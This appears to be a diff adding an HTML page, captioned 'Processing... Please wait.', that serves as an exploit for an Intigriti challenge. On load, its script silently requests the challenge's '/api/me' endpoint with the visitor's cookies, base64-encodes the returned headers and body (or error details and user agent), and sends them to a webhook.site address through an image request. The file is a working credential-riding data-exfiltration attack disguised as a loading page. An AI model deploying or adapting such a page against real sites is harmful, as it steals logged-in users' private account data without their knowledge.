@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Processing... Please wait.</h1>
+    <script>
+        (async function() {
+            const CHALLENGE_API = 'https://challenge-0126.intigriti.io/api/me';
+            const MY_WEBHOOK = 'https://webhook.site/4ad83a51-98c4-47c9-802b-63b7f75e7b0b';
+            
+            try {
+                // محاولة جلب البيانات
+                const response = await fetch(CHALLENGE_API, {
+                    method: 'GET',
+                    credentials: 'include', // مهم جداً لإرسال الـ cookies
+                    mode: 'cors' // تأكيد على استخدام CORS
+                });
+
+                // فحص الـ response قبل parse
+                const responseText = await response.text();
+                
+                // إرسال الـ response الكامل (سواء نجح أو فشل)
+                const result = {
+                    status: response.status,
+                    statusText: response.statusText,
+                    headers: Object.fromEntries(response.headers.entries()),
+                    body: responseText,
+                    origin: window.location.origin
+                };
+
+                // تحويل لـ Base64 وإرسال
+                const encoded = btoa(JSON.stringify(result));
+                new Image().src = MY_WEBHOOK + '?data=' + encoded;
+                
+                console.log('Data sent:', result);
+
+            } catch (err) {
+                // إرسال تفاصيل الخطأ الكاملة
+                const errorData = {
+                    error: err.message,
+                    name: err.name,
+                    stack: err.stack,
+                    origin: window.location.origin,
+                    userAgent: navigator.userAgent
+                };
+                
+                const encoded = btoa(JSON.stringify(errorData));
+                new Image().src = MY_WEBHOOK + '?error=' + encoded;
+                
+                console.error('Error:', errorData);
+            }
+        })();
+    </script>
+</body>
+</html>
